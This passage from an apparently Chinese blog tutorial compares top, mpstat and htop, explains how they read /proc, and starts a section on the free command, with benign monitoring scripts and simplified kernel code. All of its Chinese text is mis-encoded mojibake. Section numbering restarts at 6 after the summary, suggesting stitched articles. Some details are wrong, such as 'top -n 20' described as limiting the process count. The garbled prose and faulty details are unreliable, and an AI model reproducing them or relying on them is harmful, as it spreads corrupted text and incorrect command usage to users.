<li><strong>è„šæœ¬å’Œè‡ªåŠ¨åŒ–</strong>ï¼šå‘½ä»¤è¡Œå·¥å…·ï¼Œé€‚åˆè„šæœ¬</li>
<li><strong>æ€§èƒ½åŸºå‡†æµ‹è¯•</strong>ï¼šå¯ä»¥è®°å½•å†å²æ•°æ®</li>
</ol>
<p><strong>htop é€‚åˆ</strong>ï¼š</p>
<ol>
<li><strong>äº¤äº’å¼ä½¿ç”¨</strong>ï¼šéœ€è¦é¢‘ç¹æ“ä½œè¿›ç¨‹</li>
<li><strong>æœ¬åœ°ç»ˆç«¯</strong>ï¼šæœ‰å›¾å½¢ç•Œé¢æ”¯æŒ</li>
<li><strong>è¿›ç¨‹ç®¡ç†</strong>ï¼šéœ€è¦ç®¡ç†è¿›ç¨‹ï¼ˆæ€æ­»ã€è°ƒæ•´ä¼˜å…ˆçº§ç­‰ï¼‰</li>
<li><strong>å­¦ä¹ å’Œæ•™å­¦</strong>ï¼šç•Œé¢å‹å¥½ï¼Œé€‚åˆå­¦ä¹ </li>
</ol>
<h3 data-id="heading-40">5.3 ç»„åˆä½¿ç”¨</h3>
<p><strong>å®é™…ä½¿ç”¨å»ºè®®</strong>ï¼š</p>
<ol>
<li><strong>æ—¥å¸¸ç›‘æ§</strong>ï¼šä½¿ç”¨ htopï¼ˆå¦‚æœæ”¯æŒï¼‰æˆ– top</li>
<li><strong>CPU åˆ†æ</strong>ï¼šä½¿ç”¨ mpstat æŸ¥çœ‹è¯¦ç»†çš„ CPU ç»Ÿè®¡</li>
<li><strong>è„šæœ¬è‡ªåŠ¨åŒ–</strong>ï¼šä½¿ç”¨ top æ‰¹å¤„ç†æ¨¡å¼æˆ– mpstat</li>
<li><strong>æ•…éšœæ’æŸ¥</strong>ï¼šç»„åˆä½¿ç”¨ä¸‰ä¸ªå·¥å…·</li>
</ol>
<p><strong>ç¤ºä¾‹è„šæœ¬</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># ç›‘æ§ç³»ç»Ÿèµ„æº</span>

<span class="hljs-comment"># ä½¿ç”¨ top è·å–è¿›ç¨‹ä¿¡æ¯</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"=== Top Processes ==="</span>
top -b -n 1 | <span class="hljs-built_in">head</span> -20

<span class="hljs-comment"># ä½¿ç”¨ mpstat è·å– CPU ç»Ÿè®¡</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"=== CPU Statistics ==="</span>
mpstat -P ALL 1 1

<span class="hljs-comment"># ä½¿ç”¨ htop çš„æ‰¹å¤„ç†æ¨¡å¼ï¼ˆå¦‚æœæ”¯æŒï¼‰</span>
<span class="hljs-comment"># htop -d 1 -n 1</span>
</code></pre>
<hr/>
<h2 data-id="heading-41">6. å·¥å…·ä¸å†…æ ¸çš„å…³ç³»</h2>
<h3 data-id="heading-42">6.1 æ•°æ®æ¥æºï¼š/proc æ–‡ä»¶ç³»ç»Ÿ</h3>
<p><strong>/proc æ–‡ä»¶ç³»ç»Ÿæ˜¯ä»€ä¹ˆ</strong>ï¼š</p>
<p><code>/proc</code> æ˜¯ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œæä¾›å†…æ ¸å’Œè¿›ç¨‹ä¿¡æ¯çš„æ¥å£ã€‚å®ƒä¸æ˜¯çœŸæ­£çš„æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ˜¯å†…æ ¸æ•°æ®çš„æ¥å£ã€‚</p>
<p><strong>/proc çš„å…³é”®æ–‡ä»¶</strong>ï¼š</p>
<ol>
<li>
<p><strong><code>/proc/stat</code></strong>ï¼š</p>
<ul>
<li><strong>å†…å®¹</strong>ï¼šç³»ç»Ÿæ•´ä½“ç»Ÿè®¡ä¿¡æ¯</li>
<li><strong>æ›´æ–°</strong>ï¼šå®æ—¶æ›´æ–°</li>
<li><strong>ç”¨é€”</strong>ï¼štopã€mpstat è¯»å– CPU ç»Ÿè®¡</li>
</ul>
</li>
<li>
<p><strong><code>/proc/[pid]/stat</code></strong>ï¼š</p>
<ul>
<li><strong>å†…å®¹</strong>ï¼šå•ä¸ªè¿›ç¨‹çš„ç»Ÿè®¡ä¿¡æ¯</li>
<li><strong>æ ¼å¼</strong>ï¼šç©ºæ ¼åˆ†éš”çš„å­—æ®µ</li>
<li><strong>ç”¨é€”</strong>ï¼štopã€htop è¯»å–è¿›ç¨‹ä¿¡æ¯</li>
</ul>
</li>
<li>
<p><strong><code>/proc/[pid]/status</code></strong>ï¼š</p>
<ul>
<li><strong>å†…å®¹</strong>ï¼šè¿›ç¨‹çš„è¯¦ç»†çŠ¶æ€</li>
<li><strong>æ ¼å¼</strong>ï¼šé”®å€¼å¯¹</li>
<li><strong>ç”¨é€”</strong>ï¼šæ›´æ˜“è¯»çš„è¿›ç¨‹ä¿¡æ¯</li>
</ul>
</li>
<li>
<p><strong><code>/proc/meminfo</code></strong>ï¼š</p>
<ul>
<li><strong>å†…å®¹</strong>ï¼šå†…å­˜ä½¿ç”¨æƒ…å†µ</li>
<li><strong>æ ¼å¼</strong>ï¼šé”®å€¼å¯¹</li>
<li><strong>ç”¨é€”</strong>ï¼štopã€htop æ˜¾ç¤ºå†…å­˜ä¿¡æ¯</li>
</ul>
</li>
<li>
<p><strong><code>/proc/loadavg</code></strong>ï¼š</p>
<ul>
<li><strong>å†…å®¹</strong>ï¼šç³»ç»Ÿè´Ÿè½½å¹³å‡å€¼</li>
<li><strong>æ ¼å¼</strong>ï¼š5 ä¸ªæ•°å­—</li>
<li><strong>ç”¨é€”</strong>ï¼šæ˜¾ç¤ºç³»ç»Ÿè´Ÿè½½</li>
</ul>
</li>
</ol>
<h3 data-id="heading-43">6.2 å†…æ ¸å¦‚ä½•æä¾›è¿™äº›æ•°æ®</h3>
<p><strong>å†…æ ¸ç»Ÿè®¡ä¿¡æ¯çš„æ›´æ–°</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ—¶é’Ÿä¸­æ–­</strong>ï¼š</p>
<ul>
<li>æ¯æ¬¡æ—¶é’Ÿä¸­æ–­æ—¶æ›´æ–° CPU ç»Ÿè®¡</li>
<li>æ›´æ–°è¿›ç¨‹çš„è¿è¡Œæ—¶é—´</li>
<li>æ›´æ–°ç³»ç»Ÿè´Ÿè½½</li>
</ul>
</li>
<li>
<p><strong>è¿›ç¨‹åˆ‡æ¢</strong>ï¼š</p>
<ul>
<li>è¿›ç¨‹åˆ‡æ¢æ—¶æ›´æ–°è¿›ç¨‹ç»Ÿè®¡</li>
<li>æ›´æ–° CPU ä½¿ç”¨æ—¶é—´</li>
<li>æ›´æ–°è¿›ç¨‹çŠ¶æ€</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜ç®¡ç†</strong>ï¼š</p>
<ul>
<li>å†…å­˜åˆ†é…/é‡Šæ”¾æ—¶æ›´æ–°å†…å­˜ç»Ÿè®¡</li>
<li>æ›´æ–°è¿›ç¨‹çš„å†…å­˜ä½¿ç”¨</li>
</ul>
</li>
</ol>
<p><strong>å†…æ ¸ä»£ç ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/core.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">scheduler_tick</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-comment">// æ›´æ–°è¿è¡Œé˜Ÿåˆ—æ—¶é’Ÿ</span>
    update_rq_clock(rq);
    
    <span class="hljs-comment">// æ›´æ–°å½“å‰è¿›ç¨‹çš„ç»Ÿè®¡ä¿¡æ¯</span>
    curr-&gt;sched_class-&gt;task_tick(rq, curr, <span class="hljs-number">0</span>);
    
    <span class="hljs-comment">// æ›´æ–°å…¨å±€è´Ÿè½½</span>
    calc_global_load_tick(rq);
}
</code></pre>
<p><strong>/proc/stat çš„æ›´æ–°</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/kernel_stat.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">account_user_time</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, u64 cputime)</span>
{
    <span class="hljs-comment">// æ›´æ–°ç”¨æˆ·ç©ºé—´ CPU æ—¶é—´</span>
    p-&gt;utime += cputime;
    <span class="hljs-comment">// æ›´æ–° /proc/stat ä¸­çš„ user å­—æ®µ</span>
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-44">6.3 å·¥å…·è¯»å–æ•°æ®çš„æ–¹å¼</h3>
<p><strong>top çš„è¯»å–æ–¹å¼</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// top çš„ç®€åŒ–ä¼ªä»£ç </span>
<span class="hljs-keyword">while</span> (running) {
    <span class="hljs-comment">// è¯»å–ç³»ç»Ÿç»Ÿè®¡</span>
    read_file(<span class="hljs-string">"/proc/stat"</span>, &amp;stat_data);
    
    <span class="hljs-comment">// è¯»å–å†…å­˜ä¿¡æ¯</span>
    read_file(<span class="hljs-string">"/proc/meminfo"</span>, &amp;mem_data);
    
    <span class="hljs-comment">// éå†æ‰€æœ‰è¿›ç¨‹</span>
    <span class="hljs-keyword">for</span> (each /proc/[pid]) {
        read_file(<span class="hljs-string">"/proc/[pid]/stat"</span>, &amp;proc_data);
        <span class="hljs-comment">// è§£æå’Œæ˜¾ç¤º</span>
    }
    
    <span class="hljs-comment">// ç­‰å¾…æ›´æ–°é—´éš”</span>
    sleep(update_interval);
}
</code></pre>
<p><strong>mpstat çš„è¯»å–æ–¹å¼</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mpstat çš„ç®€åŒ–ä¼ªä»£ç </span>
<span class="hljs-comment">// è¯»å– /proc/stat</span>
read_file(<span class="hljs-string">"/proc/stat"</span>, &amp;stat_data);

<span class="hljs-comment">// è§£ææ¯ä¸ª CPU çš„æ•°æ®</span>
<span class="hljs-keyword">for</span> (each cpu in stat_data) {
    parse_cpu_stat(cpu, &amp;cpu_info);
    <span class="hljs-comment">// è®¡ç®—ç™¾åˆ†æ¯”</span>
    calculate_percentages(cpu_info);
    <span class="hljs-comment">// æ˜¾ç¤º</span>
}
</code></pre>
<p><strong>htop çš„è¯»å–æ–¹å¼</strong>ï¼š</p>
<p>htop çš„è¯»å–æ–¹å¼ä¸ top ç±»ä¼¼ï¼Œä½†å¢åŠ äº†ï¼š</p>
<ul>
<li>ç¼“å­˜æœºåˆ¶ï¼šå‡å°‘æ–‡ä»¶è¯»å–</li>
<li>å¢é‡æ›´æ–°ï¼šåªæ›´æ–°å˜åŒ–çš„æ•°æ®</li>
<li>å¼‚æ­¥è¯»å–ï¼šä¸é˜»å¡ç•Œé¢</li>
</ul>
<hr/>
<h2 data-id="heading-45">7. å®é™…åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-46">7.1 ç³»ç»Ÿæ€§èƒ½ç›‘æ§</h3>
<p><strong>æ—¥å¸¸ç›‘æ§</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ htop å®æ—¶ç›‘æ§</span>
htop

<span class="hljs-comment"># ä½¿ç”¨ top ç›‘æ§</span>
top

<span class="hljs-comment"># ä½¿ç”¨ mpstat ç›‘æ§ CPU</span>
mpstat -P ALL 1
</code></pre>
<p><strong>æ€§èƒ½åˆ†æ</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è¯†åˆ« CPU ç“¶é¢ˆ</span>
mpstat -P ALL 1 10  <span class="hljs-comment"># æ¯ 1 ç§’æ›´æ–°ï¼Œå…± 10 æ¬¡</span>

<span class="hljs-comment"># è¯†åˆ«é«˜ CPU ä½¿ç”¨ç‡çš„è¿›ç¨‹</span>
top -b -n 1 | <span class="hljs-built_in">sort</span> -k9 -rn | <span class="hljs-built_in">head</span> -10

<span class="hljs-comment"># è¯†åˆ«é«˜å†…å­˜ä½¿ç”¨ç‡çš„è¿›ç¨‹</span>
top -b -n 1 | <span class="hljs-built_in">sort</span> -k10 -rn | <span class="hljs-built_in">head</span> -10
</code></pre>
<h3 data-id="heading-47">7.2 æ•…éšœæ’æŸ¥</h3>
<p><strong>CPU ä½¿ç”¨ç‡è¿‡é«˜</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. ä½¿ç”¨ top æŸ¥çœ‹å“ªäº›è¿›ç¨‹å ç”¨ CPU</span>
top

<span class="hljs-comment"># 2. ä½¿ç”¨ mpstat æŸ¥çœ‹æ¯ä¸ªæ ¸å¿ƒçš„è´Ÿè½½</span>
mpstat -P ALL 1

<span class="hljs-comment"># 3. å¦‚æœæŸä¸ªæ ¸å¿ƒè´Ÿè½½é«˜ï¼Œå¯èƒ½æ˜¯è¿›ç¨‹ç»‘å®š</span>
<span class="hljs-comment"># æ£€æŸ¥è¿›ç¨‹çš„ CPU äº²å’Œæ€§</span>
taskset -p &lt;PID&gt;
</code></pre>
<p><strong>å†…å­˜ä½¿ç”¨ç‡è¿‡é«˜</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. ä½¿ç”¨ top æŸ¥çœ‹å†…å­˜ä½¿ç”¨</span>
top

<span class="hljs-comment"># 2. æŸ¥çœ‹è¯¦ç»†çš„å†…å­˜ä¿¡æ¯</span>
<span class="hljs-built_in">cat</span> /proc/meminfo

<span class="hljs-comment"># 3. æŸ¥çœ‹å“ªäº›è¿›ç¨‹å ç”¨å†…å­˜</span>
top -b -n 1 | <span class="hljs-built_in">sort</span> -k10 -rn | <span class="hljs-built_in">head</span> -10
</code></pre>
<p><strong>ç³»ç»Ÿè´Ÿè½½è¿‡é«˜</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½</span>
<span class="hljs-built_in">uptime</span>
<span class="hljs-comment"># æˆ–</span>
<span class="hljs-built_in">cat</span> /proc/loadavg

<span class="hljs-comment"># 2. ä½¿ç”¨ top æŸ¥çœ‹è´Ÿè½½</span>
top  <span class="hljs-comment"># ç¬¬ä¸€è¡Œæ˜¾ç¤º load average</span>

<span class="hljs-comment"># 3. ä½¿ç”¨ mpstat æŸ¥çœ‹ CPU ä½¿ç”¨æƒ…å†µ</span>
mpstat -P ALL 1
</code></pre>
<h3 data-id="heading-48">7.3 è¿›ç¨‹ç®¡ç†</h3>
<p><strong>æŸ¥æ‰¾è¿›ç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ top æœç´¢</span>
top
<span class="hljs-comment"># æŒ‰ 'u' é”®ï¼Œè¾“å…¥ç”¨æˆ·å</span>

<span class="hljs-comment"># ä½¿ç”¨ htop æœç´¢</span>
htop
<span class="hljs-comment"># æŒ‰ F3 é”®ï¼Œè¾“å…¥è¿›ç¨‹å</span>
</code></pre>
<p><strong>ç®¡ç†è¿›ç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ top æ€æ­»è¿›ç¨‹</span>
top
<span class="hljs-comment"># æŒ‰ 'k' é”®ï¼Œè¾“å…¥ PID</span>

<span class="hljs-comment"># ä½¿ç”¨ htop ç®¡ç†è¿›ç¨‹</span>
htop
<span class="hljs-comment"># æŒ‰ F9 é”®ï¼Œé€‰æ‹©è¿›ç¨‹ï¼Œé€‰æ‹©ä¿¡å·</span>
</code></pre>
<p><strong>è°ƒæ•´è¿›ç¨‹ä¼˜å…ˆçº§</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ top è°ƒæ•´</span>
top
<span class="hljs-comment"># æŒ‰ 'r' é”®ï¼Œè¾“å…¥ PIDï¼Œè¾“å…¥ nice å€¼</span>

<span class="hljs-comment"># ä½¿ç”¨ htop è°ƒæ•´</span>
htop
<span class="hljs-comment"># é€‰æ‹©è¿›ç¨‹ï¼ŒæŒ‰ F7ï¼ˆé™ä½ï¼‰æˆ– F8ï¼ˆæé«˜ï¼‰</span>
</code></pre>
<hr/>
<h2 data-id="heading-49">8. é«˜çº§æŠ€å·§å’Œæœ€ä½³å®è·µ</h2>
<h3 data-id="heading-50">8.1 æ€§èƒ½ä¼˜åŒ–</h3>
<p><strong>å‡å°‘å·¥å…·çš„èµ„æºå ç”¨</strong>ï¼š</p>
<ol>
<li>
<p><strong>å¢åŠ æ›´æ–°é—´éš”</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">top -d 5  <span class="hljs-comment"># æ¯ 5 ç§’æ›´æ–°ä¸€æ¬¡</span>
</code></pre>
</li>
<li>
<p><strong>é™åˆ¶æ˜¾ç¤ºçš„è¿›ç¨‹æ•°</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">top -n 20  <span class="hljs-comment"># åªæ˜¾ç¤ºå‰ 20 ä¸ªè¿›ç¨‹</span>
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨æ‰¹å¤„ç†æ¨¡å¼</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">top -b -n 1  <span class="hljs-comment"># è¿è¡Œä¸€æ¬¡åé€€å‡º</span>
</code></pre>
</li>
</ol>
<h3 data-id="heading-51">8.2 è„šæœ¬è‡ªåŠ¨åŒ–</h3>
<p><strong>ç›‘æ§è„šæœ¬ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># ç³»ç»Ÿç›‘æ§è„šæœ¬</span>

LOG_FILE=<span class="hljs-string">"/var/log/system_monitor.log"</span>

<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"=== <span class="hljs-subst">$(date)</span> ==="</span> &gt;&gt; <span class="hljs-variable">$LOG_FILE</span>
    
    <span class="hljs-comment"># CPU ç»Ÿè®¡</span>
    mpstat -P ALL 1 1 &gt;&gt; <span class="hljs-variable">$LOG_FILE</span>
    
    <span class="hljs-comment"># å†…å­˜ä½¿ç”¨</span>
    free -h &gt;&gt; <span class="hljs-variable">$LOG_FILE</span>
    
    <span class="hljs-comment"># Top è¿›ç¨‹</span>
    top -b -n 1 | <span class="hljs-built_in">head</span> -20 &gt;&gt; <span class="hljs-variable">$LOG_FILE</span>
    
    <span class="hljs-built_in">sleep</span> 60  <span class="hljs-comment"># æ¯ 60 ç§’è®°å½•ä¸€æ¬¡</span>
<span class="hljs-keyword">done</span>
</code></pre>
<p><strong>å‘Šè­¦è„šæœ¬ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># CPU ä½¿ç”¨ç‡å‘Šè­¦</span>

CPU_THRESHOLD=80

<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>
    CPU_USAGE=$(top -b -n 1 | grep <span class="hljs-string">"Cpu(s)"</span> | awk <span class="hljs-string">'{print $2}'</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">'%'</span> -f1)
    
    <span class="hljs-keyword">if</span> (( $(echo "<span class="hljs-variable">$CPU_USAGE</span> &gt; <span class="hljs-variable">$CPU_THRESHOLD</span>" | bc -l) )); <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Warning: CPU usage is <span class="hljs-variable">${CPU_USAGE}</span>%"</span>
        <span class="hljs-comment"># å‘é€å‘Šè­¦</span>
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-built_in">sleep</span> 10
<span class="hljs-keyword">done</span>
</code></pre>
<h3 data-id="heading-52">8.3 ä¸è¿›ç¨‹å†»ç»“çš„å…³ç³»</h3>
<p><strong>ç›‘æ§è¿›ç¨‹å†»ç»“çŠ¶æ€</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹è¿›ç¨‹çŠ¶æ€</span>
top
<span class="hljs-comment"># æŸ¥æ‰¾çŠ¶æ€ä¸º 'D'ï¼ˆä¸å¯ä¸­æ–­ç¡çœ ï¼‰çš„è¿›ç¨‹</span>
<span class="hljs-comment"># è¿™äº›è¿›ç¨‹å¯èƒ½æ˜¯è¢«å†»ç»“çš„è¿›ç¨‹</span>

<span class="hljs-comment"># ä½¿ç”¨ htop æŸ¥çœ‹</span>
htop
<span class="hljs-comment"># æŒ‰ 't' é”®åˆ‡æ¢æ ‘çŠ¶æ˜¾ç¤º</span>
<span class="hljs-comment"># æŸ¥çœ‹è¿›ç¨‹çŠ¶æ€</span>
</code></pre>
<p><strong>ç›‘æ§ç³»ç»ŸæŒ‚èµ·è¿‡ç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨ç³»ç»ŸæŒ‚èµ·å‰ï¼Œè®°å½•è¿›ç¨‹çŠ¶æ€</span>
top -b -n 1 &gt; /tmp/before_suspend.txt

<span class="hljs-comment"># ç³»ç»ŸæŒ‚èµ·åï¼Œæ¢å¤åè®°å½•</span>
top -b -n 1 &gt; /tmp/after_resume.txt

<span class="hljs-comment"># å¯¹æ¯”å·®å¼‚</span>
diff /tmp/before_suspend.txt /tmp/after_resume.txt
</code></pre>
<hr/>
<h2 data-id="heading-53">9. æ€»ç»“</h2>
<h3 data-id="heading-54">9.1 å…³é”®ç‚¹</h3>
<ol>
<li>
<p><strong>top</strong>ï¼š</p>
<ul>
<li>ç»å…¸çš„è¿›ç¨‹ç›‘æ§å·¥å…·</li>
<li>é€‚åˆç”Ÿäº§ç¯å¢ƒå’Œè„šæœ¬</li>
<li>åŠŸèƒ½å¼ºå¤§ä½†ç•Œé¢ç®€å•</li>
</ul>
</li>
<li>
<p><strong>mpstat</strong>ï¼š</p>
<ul>
<li>å¤šå¤„ç†å™¨ç»Ÿè®¡å·¥å…·</li>
<li>æä¾›è¯¦ç»†çš„ CPU ç»Ÿè®¡ä¿¡æ¯</li>
<li>é€‚åˆ CPU åˆ†æå’Œè„šæœ¬</li>
</ul>
</li>
<li>
<p><strong>htop</strong>ï¼š</p>
<ul>
<li>top çš„å¢å¼ºç‰ˆæœ¬</li>
<li>ç•Œé¢å‹å¥½ï¼Œæ”¯æŒé¼ æ ‡æ“ä½œ</li>
<li>é€‚åˆäº¤äº’å¼ä½¿ç”¨</li>
</ul>
</li>
</ol>
<h3 data-id="heading-55">9.2 æœ€ä½³å®è·µ</h3>
<ol>
<li>
<p><strong>æ ¹æ®åœºæ™¯é€‰æ‹©å·¥å…·</strong>ï¼š</p>
<ul>
<li>ç”Ÿäº§ç¯å¢ƒï¼šä½¿ç”¨ top</li>
<li>CPU åˆ†æï¼šä½¿ç”¨ mpstat</li>
<li>äº¤äº’å¼ä½¿ç”¨ï¼šä½¿ç”¨ htop</li>
</ul>
</li>
<li>
<p><strong>ç»„åˆä½¿ç”¨</strong>ï¼š</p>
<ul>
<li>æ—¥å¸¸ç›‘æ§ï¼šhtop æˆ– top</li>
<li>è¯¦ç»†åˆ†æï¼šmpstat</li>
<li>è„šæœ¬è‡ªåŠ¨åŒ–ï¼štop æˆ– mpstat</li>
</ul>
</li>
<li>
<p><strong>ç†è§£æ•°æ®æ¥æº</strong>ï¼š</p>
<ul>
<li>æ‰€æœ‰å·¥å…·éƒ½ä» <code>/proc</code> æ–‡ä»¶ç³»ç»Ÿè¯»å–æ•°æ®</li>
<li>ç†è§£ <code>/proc</code> æ–‡ä»¶ç³»ç»Ÿçš„ç»“æ„æœ‰åŠ©äºç†è§£å·¥å…·è¾“å‡º</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-56">6. free å·¥å…·è¯¦è§£</h2>
<h3 data-id="heading-57">6.1 free å·¥å…·æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><strong>free çš„å®šä¹‰</strong>ï¼š</p>
<p>free æ˜¯ Linux ç³»ç»Ÿä¸­ç”¨äºæ˜¾ç¤ºç³»ç»Ÿå†…å­˜ä½¿ç”¨æƒ…å†µçš„å‘½ä»¤è¡Œå·¥å…·ã€‚å®ƒè¯»å– <code>/proc/meminfo</code> æ–‡ä»¶ï¼Œå¹¶ä»¥äººç±»å¯è¯»çš„æ ¼å¼æ˜¾ç¤ºå†…å­˜ç»Ÿè®¡ä¿¡æ¯ã€‚</p>
<p><strong>free çš„ç‰¹ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>ç®€å•ç›´æ¥</strong>ï¼šæ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µçš„æ‘˜è¦</li>
<li><strong>å¤šç§å•ä½</strong>ï¼šæ”¯æŒ KBã€MBã€GB ç­‰å•ä½</li>
<li><strong>å®æ—¶æ•°æ®</strong>ï¼šæ¯æ¬¡è¿è¡Œéƒ½è¯»å–æœ€æ–°çš„å†…å­˜ç»Ÿè®¡</li>
<li><strong>è½»é‡çº§</strong>ï¼šèµ„æºå ç”¨æå°</li>
</ol>
<p><strong>free çš„å®‰è£…</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian/Ubuntu</span>
apt-get install procps

<span class="hljs-comment"># CentOS/RHEL</span>
yum install procps-ng

<span class="hljs-comment"># éªŒè¯å®‰è£…</span>
free --version
</code></pre>
<h3 data-id="heading-58">6.2 free çš„è¾“å‡ºè¯¦è§£</h3>
<p><strong>free è¾“å‡ºç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ free -h
              total        used        free      shared  buff/cache   available
Mem:           8.0G        2.0G        1.0G        256M        5.0G        4.8G
Swap:          4.0G          0B        4.0G
</code></pre>
<p><strong>å­—æ®µè¯¦ç»†è¯´æ˜</strong>ï¼š</p>
<ol>
<li>
<p><strong>total</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šæ€»å†…å­˜å¤§å°</li>
<li><strong>æ¥æº</strong>ï¼š<code>/proc/meminfo</code> çš„ <code>MemTotal</code></li>
<li><strong>è®¡ç®—</strong>ï¼šç³»ç»Ÿå¯åŠ¨æ—¶æ£€æµ‹åˆ°çš„ç‰©ç†å†…å­˜æ€»é‡</li>
</ul>
</li>
<li>
<p><strong>used</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šå·²ä½¿ç”¨å†…å­˜</li>
<li><strong>è®¡ç®—</strong>ï¼š<code>total - free - buff/cache</code></li>
<li><strong>æ³¨æ„</strong>ï¼šè¿™ä¸ªå€¼ä¸åŒ…æ‹¬ç¼“å†²åŒºå’Œç¼“å­˜</li>
</ul>
</li>
<li>
<p><strong>free</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šç©ºé—²å†…å­˜</li>
<li><strong>æ¥æº</strong>ï¼š<code>/proc/meminfo</code> çš„ <code>MemFree</code></li>
<li><strong>è®¡ç®—</strong>ï¼šå®Œå…¨æ²¡æœ‰è¢«ä½¿ç”¨çš„ç‰©ç†å†…å­˜</li>
</ul>
</li>
<li>
<p><strong>shared</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šå…±äº«å†…å­˜</li>
<li><strong>æ¥æº</strong>ï¼š<code>/proc/meminfo</code> çš„ <code>Shmem</code></li>
<li><strong>è®¡ç®—</strong>ï¼štmpfs å’Œå…±äº«å†…å­˜æ®µä½¿ç”¨çš„å†…å­˜</li>
</ul>
</li>
<li>
<p><strong>buff/cache</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šç¼“å†²åŒºå’Œç¼“å­˜å†…å­˜</li>
<li><strong>è®¡ç®—</strong>ï¼š<code>Buffers + Cached + SReclaimable</code></li>
<li><strong>ä½œç”¨</strong>ï¼šå¯ä»¥é‡Šæ”¾ç”¨äºåº”ç”¨ç¨‹åº</li>
</ul>
</li>
<li>
<p><strong>available</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šå¯ç”¨å†…å­˜</li>
<li><strong>æ¥æº</strong>ï¼š<code>/proc/meminfo</code> çš„ <code>MemAvailable</code></li>
<li><strong>è®¡ç®—</strong>ï¼šä¼°è®¡å¯ç”¨äºå¯åŠ¨æ–°åº”ç”¨ç¨‹åºçš„å†…å­˜ï¼ˆä¸åŒ…æ‹¬äº¤æ¢ï¼‰</li>
</ul>
</li>
</ol>
<h3 data-id="heading-59">6.3 /proc/meminfo çš„ç”ŸæˆåŸç†</h3>
<p><strong>meminfo_proc_show() å‡½æ•°</strong>ï¼š</p>
<p><code>/proc/meminfo</code> æ–‡ä»¶ç”± <code>meminfo_proc_show()</code> å‡½æ•°ç”Ÿæˆï¼Œå®ƒæ±‡æ€»å„ç§å†…å­˜ç»Ÿè®¡ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// fs/proc/meminfo.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">meminfo_proc_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sysinfo</span> <span class="hljs-title">i</span>;</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> committed;
    <span class="hljs-type">long</span> cached;
    <span class="hljs-type">long</span> available;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pages[NR_LRU_LISTS];
